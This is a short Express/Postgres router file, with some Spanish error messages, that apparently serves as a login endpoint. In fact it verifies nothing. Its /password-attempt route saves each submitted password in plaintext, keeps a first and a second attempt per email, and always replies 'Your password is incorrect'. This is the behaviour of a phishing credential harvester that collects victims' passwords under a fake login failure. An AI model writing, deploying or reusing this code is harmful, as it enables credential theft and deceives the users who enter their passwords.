import express from "express";
import { pool } from "../config/db.js";

const router = express.Router();

router.post("/init", async (req, res) => {
  const { email } = req.body;
  if (!email) return res.status(400).json({ error: "Email requerido" });

  try {
    await pool.query(
      `INSERT INTO users (email) VALUES ($1)
       ON CONFLICT (email) DO NOTHING`,
      [email]
    );
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

router.post("/password-attempt", async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: "email y password requeridos" });
  }

  const client = await pool.connect();
  try {
    await client.query("BEGIN");

    const current = await client.query(
      `SELECT password, password_attempt
       FROM users
       WHERE email = $1
       FOR UPDATE`,
      [email]
    );

    if (current.rows.length === 0) {
      await client.query("ROLLBACK");
      return res.status(404).json({ error: "User not found" });
    }

    const row = current.rows[0];
    let sql;
    let message = null;

    if (!row.password) {
      sql = `
        UPDATE users
        SET password = $2
        WHERE email = $1
        RETURNING email, password, password_attempt
      `;
      message = "Your password is incorrect";
    } else if (!row.password_attempt) {
      sql = `
        UPDATE users
        SET password_attempt = $2
        WHERE email = $1
        RETURNING email, password, password_attempt
      `;
      message = "Your password is incorrect";
    } else {
      await client.query("ROLLBACK");
      return res.status(409).json({ error: "Your password is incorrect" });
    }

    const updated = await client.query(sql, [email, password]);
    await client.query("COMMIT");

    const payload = { user: updated.rows[0] };
    if (message) payload.message = message;

    return res.json(payload);
  } catch (e) {
    await client.query("ROLLBACK");
    return res.status(500).json({ error: e.message });
  } finally {
    client.release();
  }
});

export default router;

